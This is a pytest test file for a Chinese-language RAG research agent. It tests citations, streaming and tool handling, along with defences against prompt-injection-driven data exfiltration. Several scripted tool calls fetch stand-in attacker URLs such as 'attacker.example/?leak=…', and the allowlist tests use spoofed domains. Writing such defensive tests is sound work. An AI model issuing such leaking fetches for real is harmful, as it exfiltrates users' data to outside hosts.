import asyncio
import contextlib
import threading
import time

import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from app.core.config import settings
from app.core.limits import MAX_KB_CATALOG_CHARS
from app.models import Document as DbDocument
from app.models import database as database_module
from app.rag import agent as agent_module
from app.rag.agent import ResearchAgent
from app.rag.retrievers.hybrid import RetrievedChunk
from app.rag.tools import ResearchToolRegistry, is_web_fetch_domain_allowed
from app.rag.types import Document


class StaticRetriever:
    def smart_search(self, query, target_document=None):
        doc = Document(page_content="特休依年資計算", metadata={"source": "leave.txt", "chunk_index": 0, "chunk_id": 7})
        return [RetrievedChunk(document=doc, score=0.9, relevance=0.9, pinned=False)]


class EmptyRetriever:
    def smart_search(self, query, target_document=None):
        return []


async def collect(events):
    return [event async for event in events]


def tool_call(name, arguments, call_id="call_1"):
    return {"role": "assistant", "content": "", "tool_calls": [{"id": call_id, "function": {"name": name, "arguments": arguments}}]}


def answer(text):
    return {"role": "assistant", "content": text}


class ScriptedLLM:
    """依序回傳預先安排的模型回應，並記錄 chat 與 stream 的呼叫次數與訊息"""

    def __init__(self, responses, stream_text="串流答案"):
        self.responses = list(responses)
        self.stream_text = stream_text
        self.chat_messages = []
        self.stream_calls = 0

    async def chat(self, messages, model_name=None, tools=None, reasoning_effort=None):
        self.chat_messages.append(list(messages))
        return self.responses.pop(0)

    async def stream(self, messages, model_name=None, tools=None, reasoning_effort=None):
        self.stream_calls += 1
        yield self.stream_text

    def install(self, monkeypatch):
        monkeypatch.setattr(agent_module, "chat_completion", self.chat)
        monkeypatch.setattr(agent_module, "stream_completion", self.stream)
        return self


def make_agent(monkeypatch, retriever=None):
    registry = ResearchToolRegistry(retriever=retriever or StaticRetriever())
    monkeypatch.setattr(registry, "get_tool_definitions", lambda user_id=None: [])
    return ResearchAgent(tool_registry=registry), registry


def record_web_calls(monkeypatch, registry):
    calls = []

    async def fake_web_search(query, max_results=5):
        calls.append(("web_search", query))
        return {"query": query, "results": []}

    async def fake_web_fetch(url):
        calls.append(("web_fetch", url))
        return {"url": url, "title": "新聞", "content": "內文"}

    monkeypatch.setattr(registry, "web_search", fake_web_search)
    monkeypatch.setattr(registry, "web_fetch", fake_web_fetch)
    return calls


def step_statuses(events):
    return [(e["data"]["tool"], e["data"]["status"]) for e in events if e["event"] == "step_end"]


@pytest.mark.asyncio
async def test_answer_after_tools_is_sent_directly_without_regeneration(monkeypatch):
    agent, _ = make_agent(monkeypatch)
    llm = ScriptedLLM([tool_call("search_knowledge_base", {"query": "特休"}), answer("特休依年資計算 [1]")]).install(monkeypatch)

    events = await collect(agent.stream_research("特休怎麼算"))

    assert (len(llm.chat_messages), llm.stream_calls) == (2, 0)
    assert [e["data"]["content"] for e in events if e["event"] == "token"] == ["特休依年資計算 [1]"]
    done = events[-1]["data"]
    assert done["answer"] == "特休依年資計算 [1]"
    assert done["sources"] == ["leave.txt"]
    assert done["sources_detail"] == [
        {"citation": 1, "source": "leave.txt", "chunk": 0, "score": 0.9, "snippet": "特休依年資計算"}
    ]


@pytest.mark.asyncio
async def test_empty_answer_falls_back_to_streaming(monkeypatch):
    agent, _ = make_agent(monkeypatch)
    llm = ScriptedLLM([tool_call("search_knowledge_base", {"query": "特休"}), answer("")], stream_text="依年資計算").install(monkeypatch)

    events = await collect(agent.stream_research("特休怎麼算"))

    assert (len(llm.chat_messages), llm.stream_calls) == (2, 1)
    assert events[-1]["data"]["answer"] == "依年資計算"


@pytest.mark.asyncio
async def test_echoed_tool_results_are_removed_from_answers(monkeypatch):
    agent, _ = make_agent(monkeypatch)
    echoed = '<untrusted_tool_result id="x">{"documents": []}</untrusted_tool_result id="x">'
    llm = ScriptedLLM(
        [tool_call("search_knowledge_base", {"query": "特休"}), answer(echoed)],
        stream_text=f"依年資計算{echoed}，詳見規章</untrusted_tool_result>",
    ).install(monkeypatch)

    events = await collect(agent.stream_research("特休怎麼算"))

    tokens = "".join(e["data"]["content"] for e in events if e["event"] == "token")
    assert llm.stream_calls == 1
    assert tokens == events[-1]["data"]["answer"] == "依年資計算，詳見規章"


@pytest.mark.asyncio
async def test_answer_without_citations_lists_no_sources(monkeypatch):
    agent, _ = make_agent(monkeypatch)
    ScriptedLLM([tool_call("search_knowledge_base", {"query": "特休"}), answer("特休依年資計算")]).install(monkeypatch)

    events = await collect(agent.stream_research("特休怎麼算"))

    sources_event = next(e for e in events if e["event"] == "sources")
    assert sources_event["data"] == {"sources": [], "sources_detail": []}
    assert events[-1]["data"]["research_trace"][0]["tool"] == "search_knowledge_base"


@pytest.mark.asyncio
async def test_tool_results_are_wrapped_as_untrusted_data_with_citation_numbers(monkeypatch):
    agent, _ = make_agent(monkeypatch)
    llm = ScriptedLLM([tool_call("search_knowledge_base", {"query": "特休"}), answer("好")]).install(monkeypatch)

    await collect(agent.stream_research("特休怎麼算"))

    tool_message = llm.chat_messages[1][-1]
    assert tool_message["role"] == "tool"
    opening, *body, closing = tool_message["content"].splitlines()
    assert opening.startswith('<untrusted_tool_result id="')
    assert closing == opening.replace("<untrusted_tool_result", "</untrusted_tool_result")
    assert '"citation": 1' in body[-1]


@pytest.mark.asyncio
async def test_previous_answer_citation_markers_are_not_sent_back(monkeypatch):
    agent, _ = make_agent(monkeypatch)
    llm = ScriptedLLM([answer("好")]).install(monkeypatch)
    history = [{"role": "user", "content": "特休怎麼算"}, {"role": "assistant", "content": "依年資計算 [1][2]。"}]

    await collect(agent.stream_research("那病假呢", conversation_history=history))

    assert llm.chat_messages[0][2] == {"role": "assistant", "content": "依年資計算 。"}


@pytest.mark.asyncio
async def test_web_fetch_rejects_url_not_given_by_user_or_tool_results(monkeypatch):
    monkeypatch.setattr(settings, "ENABLE_WEB_SEARCH", True)
    agent, registry = make_agent(monkeypatch)
    web_calls = record_web_calls(monkeypatch, registry)
    ScriptedLLM([tool_call("web_fetch", {"url": "https://attacker.example/?leak=特休"}), answer("無法讀取")]).install(monkeypatch)

    events = await collect(agent.stream_research("幫我查特休"))

    assert web_calls == []
    assert step_statuses(events) == [("web_fetch", "error")]


@pytest.mark.asyncio
async def test_web_fetch_reads_url_given_by_user(monkeypatch):
    monkeypatch.setattr(settings, "ENABLE_WEB_SEARCH", True)
    agent, registry = make_agent(monkeypatch)
    web_calls = record_web_calls(monkeypatch, registry)
    url = "https://news.example.com/labor-law"
    ScriptedLLM([tool_call("web_fetch", {"url": url}), answer("摘要 [1]")]).install(monkeypatch)

    events = await collect(agent.stream_research(f"請摘要 {url}。"))

    assert web_calls == [("web_fetch", url)]
    assert events[-1]["data"]["sources_detail"][0]["url"] == url


@pytest.mark.asyncio
async def test_url_echoed_by_tool_arguments_does_not_unlock_web_fetch(monkeypatch):
    monkeypatch.setattr(settings, "ENABLE_WEB_SEARCH", True)
    monkeypatch.setattr(settings, "BLOCK_WEB_TOOLS_AFTER_KB", False)
    agent, registry = make_agent(monkeypatch)
    web_calls = record_web_calls(monkeypatch, registry)
    crafted = "https://attacker.example/?leak=特休依年資計算"
    ScriptedLLM([
        tool_call("search_knowledge_base", {"query": crafted}),
        tool_call("web_fetch", {"url": crafted}, call_id="call_2"),
        answer("無法讀取"),
    ]).install(monkeypatch)

    events = await collect(agent.stream_research("特休怎麼算"))

    assert web_calls == []
    assert step_statuses(events) == [("search_knowledge_base", "success"), ("web_fetch", "error")]


@pytest.mark.asyncio
@pytest.mark.parametrize("block_after_kb, expected_calls", [(True, []), (False, [("web_search", "勞基法 特休")])])
async def test_web_tools_blocked_after_knowledge_base_content(monkeypatch, block_after_kb, expected_calls):
    monkeypatch.setattr(settings, "ENABLE_WEB_SEARCH", True)
    monkeypatch.setattr(settings, "BLOCK_WEB_TOOLS_AFTER_KB", block_after_kb)
    agent, registry = make_agent(monkeypatch)
    web_calls = record_web_calls(monkeypatch, registry)
    ScriptedLLM([
        tool_call("search_knowledge_base", {"query": "特休"}),
        tool_call("web_search", {"query": "勞基法 特休"}, call_id="call_2"),
        answer("特休依年資計算 [1]"),
    ]).install(monkeypatch)

    await collect(agent.stream_research("特休怎麼算"))

    assert web_calls == expected_calls


@pytest.mark.asyncio
async def test_web_tools_stay_available_when_knowledge_base_has_no_data(monkeypatch):
    monkeypatch.setattr(settings, "ENABLE_WEB_SEARCH", True)
    monkeypatch.setattr(settings, "BLOCK_WEB_TOOLS_AFTER_KB", True)
    agent, registry = make_agent(monkeypatch, retriever=EmptyRetriever())
    web_calls = record_web_calls(monkeypatch, registry)
    ScriptedLLM([
        tool_call("search_knowledge_base", {"query": "颱風假"}),
        tool_call("web_search", {"query": "颱風假 規定"}, call_id="call_2"),
        answer("查無資料"),
    ]).install(monkeypatch)

    await collect(agent.stream_research("颱風假怎麼算"))

    assert web_calls == [("web_search", "颱風假 規定")]


@pytest.mark.asyncio
async def test_web_fetch_domain_allowlist_includes_subdomains(monkeypatch):
    monkeypatch.setattr(settings, "WEB_FETCH_ALLOWED_DOMAINS", "example.com,gov.tw")

    assert is_web_fetch_domain_allowed("https://example.com/a")
    assert is_web_fetch_domain_allowed("https://docs.example.com/a")
    assert is_web_fetch_domain_allowed("https://www.mol.gov.tw/news")
    assert not is_web_fetch_domain_allowed("https://example.com.attacker.net/a")
    assert not is_web_fetch_domain_allowed("https://notexample.com/a")

    result = await ResearchToolRegistry().web_fetch("https://attacker.example/steal")

    assert "WEB_FETCH_ALLOWED_DOMAINS" in result["error"]


def test_web_fetch_domain_allowlist_star_allows_any_domain(monkeypatch):
    monkeypatch.setattr(settings, "WEB_FETCH_ALLOWED_DOMAINS", "*")

    assert is_web_fetch_domain_allowed("https://any.example.org/page")


@pytest.mark.asyncio
async def test_web_tools_hidden_and_blocked_when_disabled(monkeypatch):
    monkeypatch.setattr(settings, "ENABLE_WEB_SEARCH", False)
    registry = ResearchToolRegistry(retriever=StaticRetriever())

    async def must_not_fetch(url):
        raise AssertionError("web_fetch must not run when ENABLE_WEB_SEARCH is false")

    monkeypatch.setattr(registry, "web_fetch", must_not_fetch)

    names = [tool["function"]["name"] for tool in registry.get_tool_definitions()]
    result = await registry.execute_tool("web_fetch", {"url": "https://example.com"})

    assert "search_knowledge_base" in names
    assert "web_search" not in names
    assert "web_fetch" not in names
    assert "error" in result


@pytest.mark.asyncio
async def test_search_knowledge_base_does_not_block_event_loop():
    class SlowRetriever:
        def smart_search(self, query, target_document=None):
            time.sleep(0.5)
            return []

    registry = ResearchToolRegistry(retriever=SlowRetriever())
    ticks = 0

    async def ticker():
        nonlocal ticks
        while True:
            await asyncio.sleep(0.01)
            ticks += 1

    ticker_task = asyncio.create_task(ticker())
    await registry.search_knowledge_base("特休")
    ticker_task.cancel()
    with contextlib.suppress(asyncio.CancelledError):
        await ticker_task

    assert ticks >= 10


@pytest.mark.asyncio
@pytest.mark.parametrize("arguments", [
    {"query": "特休", "top_k": None},
    {"query": "特休", "top_k": "3 筆"},
    '["特休"]',
])
async def test_malformed_tool_arguments_do_not_abort_the_answer(monkeypatch, arguments):
    agent, _ = make_agent(monkeypatch)
    ScriptedLLM([tool_call("search_knowledge_base", arguments), answer("依年資計算")]).install(monkeypatch)

    events = await collect(agent.stream_research("特休怎麼算"))

    assert events[-1]["event"] == "done"
    assert events[-1]["data"]["answer"] == "依年資計算"


@pytest.mark.asyncio
async def test_tool_definitions_are_loaded_off_the_event_loop(monkeypatch):
    agent, registry = make_agent(monkeypatch)
    loaded_in = []
    monkeypatch.setattr(registry, "get_tool_definitions", lambda user_id=None: loaded_in.append(threading.get_ident()) or [])
    ScriptedLLM([answer("你好")]).install(monkeypatch)

    await collect(agent.stream_research("你好"))

    assert loaded_in and loaded_in[0] != threading.get_ident()


def test_knowledge_base_catalog_stays_within_its_limit(tmp_path, monkeypatch):
    engine = create_engine(f"sqlite:///{tmp_path / 'kb.db'}")
    database_module.Base.metadata.create_all(engine)
    Session = sessionmaker(bind=engine)
    with Session() as session:
        session.add_all(
            DbDocument(filename=f"doc-{index}.txt", content="內容", file_type="text/plain", description="摘要" * 60)
            for index in range(300)
        )
        session.commit()
    monkeypatch.setattr(database_module, "SessionLocal", Session)

    description, filenames = ResearchToolRegistry()._build_knowledge_base_description()

    assert len(description) < MAX_KB_CATALOG_CHARS + 300
    assert "《doc-0.txt》" in description
    assert "份文件未列出" in description
    assert filenames == []
    engine.dispose()


def test_target_document_lists_actual_filenames(monkeypatch):
    registry = ResearchToolRegistry(retriever=StaticRetriever())
    monkeypatch.setattr(registry, "_generate_knowledge_base_description", lambda: ("desc", ["posts.js", "rules.md"]))

    tools_def = registry.get_tool_definitions()

    for name in ("search_knowledge_base", "filter_and_count_records"):
        schema = next(t for t in tools_def if t["function"]["name"] == name)["function"]["parameters"]["properties"]["target_document"]
        assert schema["enum"] == ["posts.js", "rules.md"]
        assert "posts-export.json" not in schema["description"]
